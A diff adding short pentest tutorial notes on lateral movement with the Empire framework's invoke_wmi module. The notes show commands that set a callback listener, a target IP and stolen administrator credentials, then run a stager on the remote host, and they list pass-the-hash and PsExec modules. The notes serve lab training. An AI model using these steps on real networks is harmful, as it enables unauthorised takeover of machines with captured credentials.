@@ -1,0 +1,56 @@
+Empire - Lateral Movement with WMI
+
++ Once you have credential require, recycle them, so that we can spread to other system and effectively owning other machine in the network or completing our objective
+
++ Empire allow pentester to have the capability to perform lateral movement
+
++ Invoke-WMI module allows for easy lateral movement with credential
+
++ Requires TCP port 445 accessible
+
++ use module, check and configure the option then execute
+
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set Listener [your listener]
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName [target IP address]
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set UserName [targetted username]
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set Password [targetted user password]
+	# (Empire: powershell/lateral_movement/invoke_wmi) > execute
+
++ Example 
+
+	# (Empire) > interact Baseline
+	# (Empire: Baseline) > usemodule lateral_movement/invoke_wmi
+	# (Empire: powershell/lateral_movement/invoke_wmi) > info
+
+		Options:
+
+		  Name         Required    Value                     Description
+		  ----         --------    -------                   -----------
+		  Listener     True                                  Listener to use.                        
+		  CredID       False                                 CredID from the store to use.           
+		  ComputerName True                                  Host[s] to execute the stager on, comma 
+															 separated.                              
+		  Proxy        False       default                   Proxy to use for request (default, none,
+															 or other).                              
+		  UserName     False                                 [domain\]username to use to execute     
+															 command.                                
+		  ProxyCreds   False       default                   Proxy credentials                       
+															 ([domain\]username:password) to use for 
+															 request (default, none, or other).      
+		  UserAgent    False       default                   User-agent string to use for the staging
+															 request (default, none, or other).      
+		  Password     False                                 Password to use to execute command.     
+		  Agent        True        Baseline                  Agent to run module on.
+
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set Listener http
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName 192.168.202.148
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set UserName Administrator
+	# (Empire: powershell/lateral_movement/invoke_wmi) > set Password passw0rd!
+	# (Empire: powershell/lateral_movement/invoke_wmi) > execute
+	
++ Empire has several other lateral movement module
+	++ pass-the-hash
+	++ PsExec
+	++ PsRemoting
+	
++ These module is best to be implement and try on simulated active directory environment
